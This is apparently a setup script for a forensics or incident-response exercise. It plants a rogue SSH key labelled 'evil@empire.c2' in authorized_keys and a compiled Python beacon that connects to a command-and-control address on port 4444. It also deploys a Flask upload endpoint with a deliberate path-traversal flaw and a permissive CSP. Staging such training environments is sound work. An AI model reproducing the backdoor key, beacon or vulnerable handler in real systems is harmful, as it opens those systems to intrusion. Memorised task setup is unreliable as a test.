#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip openssh-client
pip3 install pytest flask werkzeug

mkdir -p /home/user/webapp/uploads
mkdir -p /home/user/evidence
mkdir -p /home/user/.ssh

ssh-keygen -t rsa -N "" -f /home/user/.ssh/id_rsa -C "admin@local"
ssh-keygen -t rsa -N "" -f /home/user/.ssh/rogue_rsa -C "evil@empire.c2"

cat /home/user/.ssh/id_rsa.pub > /home/user/.ssh/authorized_keys
cat /home/user/.ssh/rogue_rsa.pub >> /home/user/.ssh/authorized_keys

cat << 'EOF' > /home/user/evidence/dropper.py
import socket
def beacon():
    c2 = "198.51.100.77"
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((c2, port))
        s.send(b"Agent active")
    except:
        pass
if __name__ == "__main__":
    beacon()
EOF

python3 -c "import py_compile; py_compile.compile('/home/user/evidence/dropper.py', cfile='/home/user/evidence/dropper.pyc')"
rm /home/user/evidence/dropper.py

cat << 'EOF' > /home/user/webapp/app.py
from flask import Flask, request, make_response
import os

app = Flask(__name__)

@app.route('/upload_file', methods=['POST'])
def upload():
    file = request.files['file']
    filename = file.filename
    # Vulnerable path traversal
    save_path = os.path.join('/home/user/webapp/uploads', filename)
    file.save(save_path)

    resp = make_response("File uploaded")
    # Bad CSP
    resp.headers['Content-Security-Policy'] = "default-src * 'unsafe-inline';"
    return resp

if __name__ == '__main__':
    app.run(port=8080)
EOF

useradd -m -s /bin/bash user || true
chown -R user:user /home/user
chmod -R 777 /home/user
